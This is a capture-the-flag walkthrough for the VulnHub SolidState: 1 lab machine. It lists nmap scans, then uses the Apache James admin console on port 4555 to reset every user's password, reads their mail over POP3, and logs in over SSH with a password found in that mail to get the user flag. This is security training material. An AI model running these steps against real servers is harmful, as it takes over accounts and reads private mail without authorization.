:::::::::::::::::::::::::::::: page
# SolidState: 1 {#solidstate-1 .title}

\

## 

## SolidState: 1

- **[SolidState: 1]{style="color:#060f94;"}** :-

<!-- -->

- Download the machine :
  <https://www.vulnhub.com/entry/solidstate-1,261/>

![](images/806-1.png)

- Now unzip the file .
- Make a machine .
- Insert vmdk file in IDE Controller .
- Start the machine .

1.  [Network Scanning]{style="color:#f6d32d;"} :

- Find the machine IP :

::: codebox
    nmap -sn 192.168.2.0/24
:::

![](images/806-2.png)

- Run nmap master command :

::: codebox
    nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.237
:::

![](images/806-3.png)

- Find available port in the machine ( Optional ) :

::: codebox
    nmap -v -p- 192.168.2.237
:::

- 

::: codebox
    nmap -sC -sV -A 192.168.2.237
:::

- This command runs an aggressive scan and uses the http-enum script to
  identify potential CGI directories .

::: codebox
    nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.237
:::

![](images/806-4.png)

1.  [Web Enumeration]{style="color:#f6d32d;"} :

- IP visit in browser : <http://192.168.2.237/>

<!-- -->

- Connect to James Admin port 4555 :

::: codebox
    nc 192.168.2.237 4555
:::

- Check the user list :

::: codebox
    listusers
:::

![](images/806-5.png)

- Set all user password :

::: codebox
    setpassword james 1234
:::

::: codebox
    setpassword thomas 1234
:::

::: codebox
    setpassword john 1234
:::

::: codebox
    setpassword mindy 1234
:::

::: codebox
    setpassword mailadmin 1234
:::

![](images/806-6.png)

- Connect telnet :

::: codebox
    telnet 192.168.2.237 110
:::

- Then login john user :

::: codebox
    USER john
:::

- 

::: codebox
    PASS 1234
:::

![](images/806-7.png)

- Check john mailbox contains :

::: codebox
    LIST
:::

![](images/806-8.png)

- Retrive the mail :

::: codebox
    RETR 1
:::

![](images/806-9.png) Clue mindy access .

- In new terminal login mindy user :

::: codebox
    telnet 192.168.2.237 110
:::

- Then login john user :

::: codebox
    USER mindy
:::

- 

::: codebox
    PASS 1234
:::

- Check john mailbox contains :

::: codebox
    LIST
:::

![](images/806-10.png)

- Retrive the both mail :

::: codebox
    RETR 1
:::

- 

::: codebox
    RETR 2
:::

![](images/806-11.png)

1.  [SSH Access]{style="color:#f6d32d;"} :

- Make SSH connection :

::: codebox
    ssh mindy@192.168.2.237
:::

::: codebox
    Username : mindy
    Password : P@55W0rd1!2@
:::

![](images/806-12.png)

- After login check the list :

::: codebox
    ls
:::

- 

::: codebox
    cat user.txt
:::

![](images/806-13.png) We got the flag .
::::::::::::::::::::::::::::::
